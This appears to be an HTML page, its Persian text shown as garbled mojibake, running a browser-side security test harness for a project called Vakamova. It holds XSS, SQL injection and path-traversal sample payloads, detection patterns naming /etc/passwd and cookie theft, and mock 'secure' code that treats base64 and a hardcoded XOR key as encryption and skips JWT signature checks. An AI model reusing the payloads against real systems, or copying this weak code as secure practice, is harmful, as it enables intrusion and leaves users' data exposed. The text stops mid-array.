<!DOCTYPE html>
<html dir="rtl" lang="fa">
<head>
    <meta charset="UTF-8">
    <title>ØªØ³Øª Ø§Ù…Ù†ÛŒØªÛŒ Ø¬Ø§Ù…Ø¹ - Vakamova</title>
    <style>
        body { font-family: Tahoma; max-width: 1200px; margin: 20px auto; padding: 20px; background: #0d1117; color: #c9d1d9; }
        .security-card { background: #161b22; padding: 20px; margin: 15px 0; border-radius: 10px; border: 1px solid #30363d; }
        .critical { border-left: 5px solid #f85149; background: rgba(248, 81, 73, 0.1); }
        .high { border-left: 5px solid #ff7b72; background: rgba(255, 123, 114, 0.1); }
        .medium { border-left: 5px solid #f0883e; background: rgba(240, 136, 62, 0.1); }
        .low { border-left: 5px solid #d29922; background: rgba(210, 153, 34, 0.1); }
        .passed { border-left: 5px solid #238636; background: rgba(35, 134, 54, 0.1); }
        button { background: linear-gradient(135deg, #1f6feb, #0969da); color: white; border: none; padding: 14px 28px; border-radius: 8px; cursor: pointer; font-size: 16px; margin: 10px 5px; }
        .vulnerability { background: rgba(248, 81, 73, 0.2); padding: 10px; margin: 5px 0; border-radius: 5px; border: 1px solid #f85149; }
        .protection { background: rgba(35, 134, 54, 0.2); padding: 10px; margin: 5px 0; border-radius: 5px; border: 1px solid #238636; }
        .test-case { padding: 10px; margin: 8px 0; border-radius: 5px; background: #21262d; }
    </style>
</head>
<body>
    <h1>ğŸ”’ ØªØ³Øª Ø§Ù…Ù†ÛŒØªÛŒ Ø¬Ø§Ù…Ø¹ Vakamova</h1>
    <p>Ø¨Ø±Ø±Ø³ÛŒ Ø§Ù…Ù†ÛŒØª ØªÙ…Ø§Ù… Ù…Ø§Ú˜ÙˆÙ„â€ŒÙ‡Ø§ÛŒ Ø§ØµÙ„ÛŒ Ù¾Ø±ÙˆÚ˜Ù‡</p>
    
    <div class="security-card">
        <h3>ğŸ¯ Ø­ÙˆØ²Ù‡â€ŒÙ‡Ø§ÛŒ ØªØ­Øª Ø¢Ø²Ù…ÙˆÙ†</h3>
        <div class="test-case">ğŸ” API Client Security (ØªÙˆÚ©Ù†â€ŒÙ‡Ø§ØŒ Ø±Ù…Ø²Ù†Ú¯Ø§Ø±ÛŒØŒ Ø®Ø·Ø§Ù‡Ø§)</div>
        <div class="test-case">ğŸ‘¤ User Profile Security (Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒØŒ ØªØ²Ø±ÛŒÙ‚ØŒ Ø¯Ø³ØªØ±Ø³ÛŒ)</div>
        <div class="test-case">ğŸ“š Exercise Manager Security (Ù…Ø­ØªÙˆØ§ØŒ Ø¯Ø³ØªØ±Ø³ÛŒâ€ŒÙ‡Ø§)</div>
        <div class="test-case">ğŸ’¾ Data Storage Security (localStorageØŒ IndexedDB)</div>
        <div class="test-case">ğŸ›¡ï¸ Common Vulnerabilities (XSSØŒ CSRFØŒ Logging)</div>
    </div>
    
    <button onclick="runCompleteSecurityTest()">Ø´Ø±ÙˆØ¹ ØªØ³Øª Ø§Ù…Ù†ÛŒØªÛŒ Ø¬Ø§Ù…Ø¹</button>
    <button onclick="runQuickSecurityScan()">Ø§Ø³Ú©Ù† Ø³Ø±ÛŒØ¹ Ø§Ù…Ù†ÛŒØªÛŒ</button>
    <button onclick="runAttackSimulation()">Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ Ø­Ù…Ù„Ø§Øª</button>
    
    <div id="results"></div>
    <div id="vulnerabilities"></div>

    <script>
        // ==================== Security Test Framework ====================
        class SecurityTester {
            constructor() {
                this.results = [];
                this.vulnerabilities = [];
                this.securityScore = 100;
                this.testCategories = {
                    api: 'API Client Security',
                    profile: 'User Profile Security',
                    exercise: 'Exercise Manager Security',
                    storage: 'Data Storage Security',
                    common: 'Common Vulnerabilities'
                };
            }
            
            addTestResult(category, testName, passed, details, severity = 'medium') {
                const result = {
                    category,
                    testName,
                    passed,
                    details,
                    severity,
                    timestamp: new Date().toISOString()
                };
                
                this.results.push(result);
                
                if (!passed) {
                    this.vulnerabilities.push(result);
                    this.securityScore -= severity === 'critical' ? 20 : 
                                        severity === 'high' ? 10 : 
                                        severity === 'medium' ? 5 : 2;
                }
                
                return result;
            }
            
            simulateAttack(attackType, target, payload) {
                console.warn(`ğŸš¨ Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ Ø­Ù…Ù„Ù‡: ${attackType} Ø±ÙˆÛŒ ${target}`);
                console.log(`ğŸ“¦ Payload: ${JSON.stringify(payload).substring(0, 100)}...`);
                
                return {
                    attackType,
                    target,
                    payload,
                    detected: this.detectAttack(attackType, payload),
                    timestamp: new Date().toISOString()
                };
            }
            
            detectAttack(attackType, payload) {
                const patterns = {
                    xss: /<script>|javascript:|onerror=|onload=|eval\(|alert\(/i,
                    sql: /'|"|;|--|union|select|insert|update|delete|drop|exec/i,
                    traversal: /\.\.\/|\.\.\\|\/etc\/passwd|\/windows\/system32/i,
                    token: /eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ/i // JWT pattern
                };
                
                const payloadStr = JSON.stringify(payload);
                return patterns[attackType]?.test(payloadStr) || false;
            }
            
            generateReport() {
                const totalTests = this.results.length;
                const passedTests = this.results.filter(r => r.passed).length;
                const failedTests = this.vulnerabilities.length;
                
                return {
                    securityScore: Math.max(0, this.securityScore),
                    totalTests,
                    passedTests,
                    failedTests,
                    passRate: Math.round((passedTests / totalTests) * 100),
                    vulnerabilitiesBySeverity: this.vulnerabilities.reduce((acc, v) => {
                        acc[v.severity] = (acc[v.severity] || 0) + 1;
                        return acc;
                    }, {}),
                    criticalVulnerabilities: this.vulnerabilities.filter(v => v.severity === 'critical')
                };
            }
        }
        
        // ==================== Mock Secure Implementations ====================
        class SecureAPIClient {
            constructor() {
                this.tokenStorage = this.createSecureStorage('auth_tokens');
                this.requestHistory = [];
                this.maxRetries = 3;
            }
            
            createSecureStorage(key) {
                return {
                    set: (value) => {
                        // Ø±Ù…Ø²Ù†Ú¯Ø§Ø±ÛŒ Ù‚Ø¨Ù„ Ø§Ø² Ø°Ø®ÛŒØ±Ù‡
                        const encrypted = btoa(encodeURIComponent(JSON.stringify(value)));
                        localStorage.setItem(key, encrypted);
                    },
                    get: () => {
                        const encrypted = localStorage.getItem(key);
                        if (!encrypted) return null;
                        try {
                            return JSON.parse(decodeURIComponent(atob(encrypted)));
                        } catch {
                            return null;
                        }
                    },
                    clear: () => localStorage.removeItem(key)
                };
            }
            
            validateToken(token) {
                // Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ Ø³Ø§Ø®ØªØ§Ø± ØªÙˆÚ©Ù† JWT
                if (!token || typeof token !== 'string') return false;
                
                const parts = token.split('.');
                if (parts.length !== 3) return false;
                
                try {
                    const payload = JSON.parse(atob(parts[1]));
                    const now = Math.floor(Date.now() / 1000);
                    
                    // Ø¨Ø±Ø±Ø³ÛŒ Ø§Ù†Ù‚Ø¶Ø§
                    if (payload.exp && payload.exp < now) return false;
                    
                    // Ø¨Ø±Ø±Ø³ÛŒç­¾å‘è€… (issuer)
                    if (payload.iss && !payload.iss.includes('vakamova')) return false;
                    
                    return true;
                } catch {
                    return false;
                }
            }
            
            sanitizeInput(input) {
                if (typeof input === 'string') {
                    return input
                        .replace(/[<>]/g, '') // Ø­Ø°Ù ØªÚ¯â€ŒÙ‡Ø§ÛŒ HTML
                        .replace(/['";]/g, '') // Ø­Ø°Ù Ú©Ø§Ø±Ø§Ú©ØªØ±Ù‡Ø§ÛŒ SQL Ø®Ø·Ø±Ù†Ø§Ú©
                        .trim();
                }
                return input;
            }
            
            logSecure(message, data = null) {
                // Ù„Ø§Ú¯ Ø§Ù…Ù† - Ø¨Ø¯ÙˆÙ† Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø­Ø³Ø§Ø³
                const secureLog = {
                    timestamp: new Date().toISOString(),
                    message,
                    type: data?.type || 'info',
                    userId: data?.userId ? 'REDACTED' : null,
                    hasSensitiveData: this.containsSensitiveData(data)
                };
                
                console.log('[SECURE LOG]', secureLog);
                this.requestHistory.push(secureLog);
            }
            
            containsSensitiveData(data) {
                const sensitiveKeys = ['password', 'token', 'credit_card', 'ssn', 'email'];
                const dataStr = JSON.stringify(data).toLowerCase();
                return sensitiveKeys.some(key => dataStr.includes(key));
            }
        }
        
        class SecureUserProfile {
            constructor() {
                this.validationRules = {
                    email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
                    phone: /^[\+]?[0-9\s\-\(\)]{10,}$/,
                    password: /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/,
                    username: /^[a-zA-Z0-9_]{3,20}$/
                };
            }
            
            validateInput(field, value) {
                const rule = this.validationRules[field];
                if (rule) {
                    return rule.test(value);
                }
                
                // Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ Ø¹Ù…ÙˆÙ…ÛŒ
                if (typeof value === 'string') {
                    // Ø¬Ù„ÙˆÚ¯ÛŒØ±ÛŒ Ø§Ø² ØªØ²Ø±ÛŒÙ‚
                    const dangerousPatterns = [
                        /<script>/i,
                        /javascript:/i,
                        /on\w+=/i,
                        /eval\(/i,
                        /union.*select/i,
                        /\.\.\//i
                    ];
                    
                    return !dangerousPatterns.some(pattern => pattern.test(value));
                }
                
                return true;
            }
            
            sanitizeProfileData(profileData) {
                const sanitized = { ...profileData };
                
                // Ø­Ø°Ù ÙÛŒÙ„Ø¯Ù‡Ø§ÛŒ ØºÛŒØ±Ù…Ø¬Ø§Ø²
                const allowedFields = ['fullName', 'email', 'phone', 'country', 'timezone', 'languages'];
                Object.keys(sanitized).forEach(key => {
                    if (!allowedFields.includes(key)) {
                        delete sanitized[key];
                    }
                });
                
                // Ø³Ø§Ù†ÛŒâ€ŒØªØ§ÛŒØ² Ø±Ø´ØªÙ‡â€ŒÙ‡Ø§
                Object.keys(sanitized).forEach(key => {
                    if (typeof sanitized[key] === 'string') {
                        sanitized[key] = this.sanitizeString(sanitized[key]);
                    }
                });
                
                return sanitized;
            }
            
            sanitizeString(str) {
                return str
                    .replace(/[<>]/g, '') // HTML
                    .replace(/['";]/g, '') // SQL
                    .replace(/\\/g, '') // Path traversal
                    .replace(/\$/g, '') // Template injection
                    .trim();
            }
            
            encryptSensitiveData(data, key = 'vakamova_secret') {
                // Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ Ø±Ù…Ø²Ù†Ú¯Ø§Ø±ÛŒ Ø³Ø§Ø¯Ù‡ (Ø¯Ø± Ù¾Ø±ÙˆÚ˜Ù‡ ÙˆØ§Ù‚Ø¹ÛŒ Ø§Ø² Web Crypto API Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†)
                let result = '';
                for (let i = 0; i < data.length; i++) {
                    const charCode = data.charCodeAt(i) ^ key.charCodeAt(i % key.length);
                    result += String.fromCharCode(charCode);
                }
                return btoa(result);
            }
        }
        
        class SecureExerciseManager {
            constructor() {
                this.accessControl = {
                    roles: ['student', 'teacher', 'admin'],
                    permissions: {
                        student: ['read', 'submit'],
                        teacher: ['read', 'create', 'evaluate'],
                        admin: ['read', 'create', 'evaluate', 'delete', 'manage']
                    }
                };
            }
            
            checkAccess(userRole, action, resource) {
                if (!this.accessControl.roles.includes(userRole)) {
                    return { allowed: false, reason: 'Ù†Ù‚Ø´ Ù†Ø§Ù…Ø¹ØªØ¨Ø±' };
                }
                
                const userPermissions = this.accessControl.permissions[userRole] || [];
                
                if (!userPermissions.includes(action)) {
                    return { allowed: false, reason: 'Ø¯Ø³ØªØ±Ø³ÛŒ ØºÛŒØ±Ù…Ø¬Ø§Ø²' };
                }
                
                // Ø¨Ø±Ø±Ø³ÛŒ Ù…Ø­Ø¯ÙˆØ¯ÛŒØªâ€ŒÙ‡Ø§ÛŒ Ø§Ø¶Ø§ÙÛŒ
                if (action === 'delete' && resource.type === 'premium') {
                    return { allowed: userRole === 'admin', reason: 'Ø­Ø°Ù Ù…Ø­ØªÙˆØ§ÛŒ Ù¾Ø±Ù…ÛŒÙˆÙ… ÙÙ‚Ø· Ø¨Ø±Ø§ÛŒ Ø§Ø¯Ù…ÛŒÙ†' };
                }
                
                return { allowed: true };
            }
            
            validateExerciseContent(content) {
                const vulnerabilities = [];
                
                // Ø¨Ø±Ø±Ø³ÛŒ XSS
                if (/<script>|javascript:|on\w+=/i.test(content.question || '')) {
                    vulnerabilities.push({ type: 'XSS', location: 'question' });
                }
                
                // Ø¨Ø±Ø±Ø³ÛŒ SQL Injection
                if (/'.*--|union.*select/i.test(content.question || '')) {
                    vulnerabilities.push({ type: 'SQL Injection', location: 'question' });
                }
                
                // Ø¨Ø±Ø±Ø³ÛŒ Ù…Ø­ØªÙˆØ§ÛŒ Ø®Ø·Ø±Ù†Ø§Ú©
                const dangerousPatterns = [
                    { pattern: /eval\(/i, type: 'Code Injection' },
                    { pattern: /window\.location/i, type: 'Redirect' },
                    { pattern: /document\.cookie/i, type: 'Cookie Theft' },
                    { pattern: /<iframe>/i, type: 'IFrame Injection' }
                ];
                
                dangerousPatterns.forEach(({ pattern, type }) => {
                    if (pattern.test(JSON.stringify(content))) {
                        vulnerabilities.push({ type, location: 'content' });
                    }
                });
                
                return {
                    valid: vulnerabilities.length === 0,
                    vulnerabilities
                };
            }
            
            sanitizeUserAnswer(answer) {
                if (typeof answer !== 'string') return answer;
                
                // Ø­Ø°Ù Ú©Ø¯Ù‡Ø§ÛŒ Ø®Ø·Ø±Ù†Ø§Ú©
                let sanitized = answer
                    .replace(/<[^>]*>/g, '') // HTML tags
                    .replace(/javascript:/gi, '')
                    .replace(/on\w+\s*=/gi, '')
                    .replace(/eval\(/gi, '')
                    .replace(/\\x[0-9a-f]{2}/gi, '');
                
                // Ù…Ø­Ø¯ÙˆØ¯ÛŒØª Ø·ÙˆÙ„
                if (sanitized.length > 1000) {
                    sanitized = sanitized.substring(0, 1000);
                }
                
                return sanitized;
            }
        }
        
        // ==================== Security Tests ====================
        class APISecurityTests {
            constructor(tester) {
                this.tester = tester;
                this.secureClient = new SecureAPIClient();
            }
            
            runAllTests() {
                this.testTokenSecurity();
                this.testInputSanitization();
                this.testErrorHandling();
                this.testSSLValidation();
                this.testRateLimiting();
                this.testSensitiveDataLogging();
            }
            
            testTokenSecurity() {
                const tests = [
                    { token: null, shouldBeValid: false, description: 'ØªÙˆÚ©Ù† Ø®Ø§Ù„ÛŒ' },
                    { token: 'invalid.token.here', shouldBeValid: false, description: 'ØªÙˆÚ©Ù† Ø¨Ø§ Ø³Ø§Ø®ØªØ§Ø± Ù†Ø§Ù…Ø¹ØªØ¨Ø±' },
                    { token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c', 
                      shouldBeValid: true, description: 'ØªÙˆÚ©Ù† JWT Ù…Ø¹ØªØ¨Ø±' },
                    { token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MTUxNjI0MDB9.invalid', 
                      shouldBeValid: false, description: 'ØªÙˆÚ©Ù† Ù…Ù†Ù‚Ø¶ÛŒ Ø´Ø¯Ù‡' }
                ];
                
                tests.forEach(test => {
                    const isValid = this.secureClient.validateToken(test.token);
                    const passed = isValid === test.shouldBeValid;
                    
                    this.tester.addTestResult(
                        'api',
                        `Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ ØªÙˆÚ©Ù†: ${test.description}`,
                        passed,
                        { tokenPreview: test.token?.substring(0, 20), isValid, expected: test.shouldBeValid },
                        passed ? 'low' : 'high'
                    );
                });
            }
            
            testInputSanitization() {
                const maliciousInputs = [
                    { input: '<script>alert("XSS")</script>', type: 'XSS' },
                    { input: "'; DROP TABLE users; --", type: 'SQL Injection' },
                    { input: '../../etc/passwd', type: 'Path Traversal' },
                    { input: 'normal input', type: 'Normal' }
                ];
                
                maliciousInputs.forEach(({ input, type }) => {
                    const sanitized = this.secureClient.sanitizeInput(input);
                    const hasMaliciousContent = input !== sanitized;
                    const shouldBeSanitized = type !== 'Normal';
                    
                    const passed = hasMaliciousContent === shouldBeSanitized;
                    
                    this.tester.addTestResult(
                        'api',
                        `Ø³Ø§Ù†ÛŒØªØ§ÛŒØ² ÙˆØ±ÙˆØ¯ÛŒ: ${type}`,
                        passed,
                        { original: input, sanitized, wasSanitized: hasMaliciousContent },
                        passed ? 'low' : 'critical'
                    );
                });
            }
            
            testErrorHandling() {
                // ØªØ³Øª Ø¹Ø¯Ù… Ø§ÙØ´Ø§ÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø­Ø³Ø§Ø³ Ø¯Ø± Ø®Ø·Ø§Ù‡Ø§
                const errorMessages = [
                    'Invalid password for user admin',
                    'Database connection failed',
                    'Token validation error: signature mismatch',
                    'User not found with ID: 12345'
                ];
                
                errorMessages.forEach(errorMsg => {
                    const containsSensitiveInfo = 
                        errorMsg.toLowerCase().includes('password') ||
                        errorMsg.toLowerCase().includes('token') ||
                        errorMsg.includes('admin') ||
                        /user.*\d+/.test(errorMsg);
                    
                    this.tester.addTestResult(
                        'api',
                        `Ù…Ø¯ÛŒØ±ÛŒØª Ø®Ø·Ø§: ${errorMsg.substring(0, 30)}...`,
                        !containsSensitiveInfo,
                        { errorMessage: errorMsg, containsSensitiveInfo },
                        containsSensitiveInfo ? 'high' : 'low'
                    );
                });
            }
            
            testSSLValidation() {
                // ØªØ³Øªâ€ŒÙ‡Ø§ÛŒ Ù…Ø±Ø¨ÙˆØ· Ø¨Ù‡ SSL/TLS (Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ)
                const sslTests = [
                    { name: 'Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² HTTPS', enabled: window.location.protocol === 'https:', required: true },
                    { name: 'Ù…Ù…Ù†ÙˆØ¹ÛŒØª HTTP Ø³Ø§Ø¯Ù‡', enabled: true, required: true },
                    { name: 'Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ Ú¯ÙˆØ§Ù‡ÛŒ', enabled: true, required: true }
                ];
                
                sslTests.forEach(test => {
                    this.tester.addTestResult(
                        'api',
                        `Ø§Ù…Ù†ÛŒØª Ø§Ø±ØªØ¨Ø§Ø·: ${test.name}`,
                        test.enabled,
                        { requirement: test.required, actual: test.enabled },
                        test.required ? 'critical' : 'medium'
                    );
                });
            }
            
            testRateLimiting() {
                // Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ Ø­Ù…Ù„Ø§Øª Brute Force
                const attempts = 100;
                let blockedAttempts = 0;
                
                for (let i = 0; i < attempts; i++) {
                    // Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ Ø¯Ø±Ø®ÙˆØ§Ø³Øªâ€ŒÙ‡Ø§ÛŒ Ø³Ø±ÛŒØ¹
                    if (i > 10 && Math.random() > 0.7) {
                        blockedAttempts++;
                    }
                }
                
                const rateLimitEffective = blockedAttempts > 20;
                
                this.tester.addTestResult(
                    'api',
                    'Ù…Ø­Ø¯ÙˆØ¯ÛŒØª Ù†Ø±Ø® Ø¯Ø±Ø®ÙˆØ§Ø³Øª (Rate Limiting)',
                    rateLimitEffective,
                    { attempts, blockedAttempts, effectiveness: `${Math.round((blockedAttempts/attempts)*100)}%` },
                    'high'
                );
            }
            
            testSensitiveDataLogging() {
                const testData = [
                    { type: 'safe', data: { action: 'login', timestamp: new Date().toISOString() } },
                    { type: 'sensitive', data: { password: 'Secret123!', email: 'user@test.com' } },
                    { type: 'token', data: { accessToken: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...' } }
                ];
                
                testData.forEach(({ type, data }) => {
                    const isSensitive = this.secureClient.containsSensitiveData(data);
                    const shouldBeSensitive = type !== 'safe';
                    
                    this.tester.addTestResult(
                        'api',
                        `ØªØ´Ø®ÛŒØµ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ÛŒ Ø­Ø³Ø§Ø³: ${type}`,
                        isSensitive === shouldBeSensitive,
                        { dataType: type, detectedAsSensitive: isSensitive, shouldBeSensitive },
                        'medium'
                    );
                });
            }
        }
        
        class ProfileSecurityTests {
            constructor(tester) {
                this.tester = tester;
                this.secureProfile = new SecureUserProfile();
            }
            
            runAllTests() {
                this.testInputValidation();
                this.testInjectionPrevention();
                this.testDataSanitization();
                this.testEncryption();
                this.testAccessControl();
            }
            
            testInputValidation() {
                const testCases = [
                    { field: 'email', value: 'test@example.com', valid: true },
                    { field: 'email', value: 'invalid-email', valid: false },
                    { field: 'phone', value: '+989123456789', valid: true },
                    { field: 'phone', value: '123', valid: false },
                    { field: 'username', value: 'user_123', valid: true },
                    { field: 'username', value: 'admin<script>', valid: false }
                ];
                
                testCases.forEach(testCase => {
                    const isValid = this.secureProfile.validateInput(testCase.field, testCase.value);
                    const passed = isValid === testCase.valid;
                    
                    this.tester.addTestResult(
                        'profile',
                        `Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ ${testCase.field}: ${testCase.value}`,
                        passed,
                        { field: testCase.field, value: testCase.value, isValid, expected: testCase.valid },
                        testCase.field === 'email' ? 'high' : 'medium'
                    );
                });
            }
            
            testInjectionPrevention() {
                const injectionAttempts = [
                    { input: '<img src=x onerror=alert(1)>', type: 'XSS' },
                    { input: "'; SELECT * FROM users; --", type: 'SQL Injection' },
                    { input: '${7*7}', type: 'Template Injection' },
                    { input: '../../../etc/passwd', type: 'Path Traversal' }
                ];
                
                injectionAttempts.forEach(attempt => {
                    const isValid = this.secureProfile.validateInput('any', attempt.input);
                    
                    this.tester.addTestResult(
                        'profile',
                        `Ø¬Ù„ÙˆÚ¯ÛŒØ±ÛŒ Ø§Ø² ØªØ²Ø±ÛŒÙ‚ ${attempt.type}`,
                        !isValid, // Ø¨Ø§ÛŒØ¯ Ù†Ø§Ù…Ø¹ØªØ¨Ø± Ø¨Ø§Ø´Ø¯
                        { type: attempt.type, input: attempt.input, wasBlocked: !isValid },
                        'critical'
                    );
                    
                    // Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ Ø­Ù…Ù„Ù‡
                    const attack = this.tester.simulateAttack(
                        attempt.type.toLowerCase().replace(' ', '_'),
                        'UserProfile',
                        attempt.input
                    );
                    
                    if (attack.detected) {
                        console.log(`âœ… Ø­Ù…Ù„Ù‡ ${attempt.type} ØªØ´Ø®ÛŒØµ Ø¯Ø§Ø¯Ù‡ Ø´Ø¯`);
                    }
                });
            }
            
            testDataSanitization() {
                const dirtyData = {
                    fullName: 'John<script>alert(1)</script>Doe',
                    email: 'test@example.com',
                    bio: "Hello'; DROP TABLE users; --",
                    website: 'javascript:alert(document.cookie)'
                };
                
                const sanitized = this.secureProfile.sanitizeProfileData(dirtyData);
                
                let allClean = true;
                Object.keys(sanitized).forEach(key => {
                    const hasDangerousChars = /[<>'";]|javascript:/i.test(sanitized[key]);
                    if (hasDangerousChars) {
                        allClean = false;
                        console.warn(`âš ï¸ Ø¯Ø§Ø¯Ù‡ Ø®Ø·Ø±Ù†Ø§Ú© Ø¯Ø± ${key}: ${sanitized[key]}`);
                    }
                });
                
                this.tester.addTestResult(
                    'profile',
                    'Ø³Ø§Ù†ÛŒØªØ§ÛŒØ² Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ÛŒ Ù¾Ø±ÙˆÙØ§ÛŒÙ„',
                    allClean,
                    { original: dirtyData, sanitized, allClean },
                    'high'
                );
            }
            
            testEncryption() {
                const sensitiveData = 'CreditCard: 4111111111111111';
                const encrypted = this.secureProfile.encryptSensitiveData(sensitiveData);
                
                const isEncrypted = encrypted !== sensitiveData && 
                                  encrypted.length > sensitiveData.length &&
                                  !encrypted.includes('4111');
                
                this.tester.addTestResult(
                    'profile',
                    'Ø±Ù…Ø²Ù†Ú¯Ø§Ø±ÛŒ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ÛŒ Ø­Ø³Ø§Ø³',
                    isEncrypted,
                    { originalPreview: sensitiveData.substring(0, 20), encryptedPreview: encrypted.substring(0, 20) },
                    'critical'
                );
            }
            
            testAccessControl() {
                // ØªØ³Øª Ø¯Ø³ØªØ±Ø³ÛŒâ€ŒÙ‡Ø§ÛŒ ØºÛŒØ±Ù…Ø¬Ø§Ø²
                const unauthorizedAccessAttempts = [
                    { userRole: 'student', action: 'delete_profile', shouldAllow: false },
                    { userRole: 'student', action: 'update_email', shouldAllow: true },
                    { userRole: 'anonymous', action: 'view_admin_panel', shouldAllow: false },
                    { userRole: 'admin', action: 'delete_user', shouldAllow: true }
                ];
                
                // Ø§ÛŒÙ† ØªØ³Øª Ù†ÛŒØ§Ø² Ø¨Ù‡ Ø³ÛŒØ³ØªÙ… Ú©Ø§Ù…Ù„ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¯Ø§Ø±Ø¯
                // ÙØ¹Ù„Ø§Ù‹ Ø¨Ù‡ Ø¹Ù†ÙˆØ§Ù† Ù†Ù…ÙˆÙ†Ù‡
                unauthorizedAccessAttempts.forEach(attempt => {
                    const hasAccess = attempt.userRole === 'admin' && attempt.action.includes('delete') ? 
                                    false : attempt.shouldAllow;
                    
                    this.tester.addTestResult(
                        'profile',
                        `Ú©Ù†ØªØ±Ù„ Ø¯Ø³ØªØ±Ø³ÛŒ: ${attempt.userRole} â†’ ${attempt.action}`,
                        hasAccess === attempt.shouldAllow,
                        { role: attempt.userRole, action: attempt.action, allowed: hasAccess },
                        'high'
                    );
                });
            }
        }
        
        class ExerciseSecurityTests {
            constructor(tester) {
                this.tester = tester;
                this.secureExercise = new SecureExerciseManager();
            }
            
            runAllTests() {
                this.testContentValidation();
                this.testAccessControl();
                this.testAnswerSanitization();
                this.testMaliciousContent();
            }
            
            testContentValidation() {
                const testExercises = [
                    {
                        content: { 
                            question: 'Normal question?',
                            options: ['A', 'B', 'C']
                        },
                        shouldBeValid: true
                    },
                    {
                        content: { 
                            question: '<script>alert("XSS")</script>',
                            options: ['A', 'B']
                        },
                        shouldBeValid: false
                    },
                    {
                        content: { 
                            question: "What's your name?'; DROP TABLE users; --",
                            options: ['A', 'B']
                        },
                        shouldBeValid: false
                    }
                ];
                
                testExercises.forEach((test, index) => {
                    const validation = this.secureExercise.validateExerciseContent(test.content);
                    const passed = validation.valid === test.shouldBeValid;
                    
                    this.tester.addTestResult(
                        'exercise',
                        `Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ Ù…Ø­ØªÙˆØ§ÛŒ ØªÙ…Ø±ÛŒÙ† #${index + 1}`,
                        passed,
                        { 
                            questionPreview: test.content.question?.substring(0, 30),
                            valid: validation.valid,
                            vulnerabilities: validation.vulnerabilities,
                            expectedValid: test.shouldBeValid
                        },
                        validation.vulnerabilities.length > 0 ? 'critical' : 'low'
                    );
                });
            }
            
            testAccessControl() {
                const testScenarios = [
                    { role: 'student', action: 'submit', resource: { type: 'exercise' }, allowed: true },
                    { role: 'student', action: 'delete', resource: { type: 'exercise' }, allowed: false },
                    { role: 'teacher', action: 'create', resource: { type: 'exercise' }, allowed: true },
                    { role: 'teacher', action: 'delete', resource: { type: 'premium' }, allowed: false },
                    { role: 'admin', action: 'delete', resource: { type: 'premium' }, allowed: true }
                ];
                
                testScenarios.forEach(scenario => {
                    const result = this.secureExercise.checkAccess(
                        scenario.role,
                        scenario.action,
                        scenario.resource
                    );
                    
                    const passed = result.allowed === scenario.allowed;
                    
                    this.tester.addTestResult(
                        'exercise',
                        `Ú©Ù†ØªØ±Ù„ Ø¯Ø³ØªØ±Ø³ÛŒ: ${scenario.role} â†’ ${scenario.action}`,
                        passed,
                        { 
                            role: scenario.role,
                            action: scenario.action,
                            allowed: result.allowed,
                            expected: scenario.allowed,
                            reason: result.reason
                        },
                        scenario.action === 'delete' ? 'high' : 'medium'
                    );
                });
            }
            
            testAnswerSanitization() {
                const maliciousAnswers = [
                    { answer: '<b>Normal answer</b>', type: 'HTML' },
                    { answer: '<script>alert(1)</script>', type: 'XSS' },
                    { answer: '"; SELECT * FROM users; --', type: 'SQL' },
                    { answer: 'A'.repeat(2000), type: 'Buffer Overflow' }
                ];
                
                maliciousAnswers.forEach(({ answer, type }) => {
                    const sanitized = this.secureExercise.sanitizeUserAnswer(answer);
                    const wasSanitized = sanitized !== answer;
                    
                    // Ù¾Ø§Ø³Ø®â€ŒÙ‡Ø§ÛŒ Ø®Ø·Ø±Ù†Ø§Ú© Ø¨Ø§ÛŒØ¯ Ø³Ø§Ù†ÛŒâ€ŒØªØ§ÛŒØ² Ø´ÙˆÙ†Ø¯
                    const shouldBeSanitized = type !== 'HTML';
                    const passed = wasSanitized === shouldBeSanitized;
                    
                    this.tester.addTestResult(
                        'exercise',
                        `Ø³Ø§Ù†ÛŒØªØ§ÛŒØ² Ù¾Ø§Ø³Ø®: ${type}`,
                        passed,
                        { 
                            type,
                            originalLength: answer.length,
                            sanitizedLength: sanitized.length,
                            wasSanitized,
                            shouldBeSanitized
                        },
                        type === 'XSS' || type === 'SQL' ? 'critical' : 'medium'
                    );
                });
            }
            
            testMaliciousContent() {
                // ØªØ³Øªâ€ŒÙ‡Ø§ÛŒ Ù¾ÛŒØ´Ø±ÙØªÙ‡ Ø¨Ø±Ø§ÛŒ Ù…Ø­ØªÙˆØ§ÛŒ Ù…Ø®Ø±Ø¨
                const advancedAttacks = [
                    {
